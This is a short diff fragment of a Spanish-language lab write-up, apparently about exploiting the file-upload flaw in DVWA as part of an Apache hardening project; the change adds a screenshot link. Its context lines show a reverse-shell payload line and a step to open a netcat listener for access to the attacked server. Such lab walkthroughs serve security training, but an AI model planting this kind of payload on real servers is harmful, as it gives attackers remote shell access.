@@ -17,6 +17,7 @@ exec("bin/sh -i <&3 >&3 2>&3");
 ```
 
 Se carga este archivo desde el cargador del servidor.
+![Carga archivo](https://github.com/PPS11148274/apache_hardening/blob/main/DVWA/file_upload/asset/carga_archivo.png)
 
 Ahora se crea un listener con **netcat**, que será donde se tendra acceso al servidor atacado (DVWA).
 
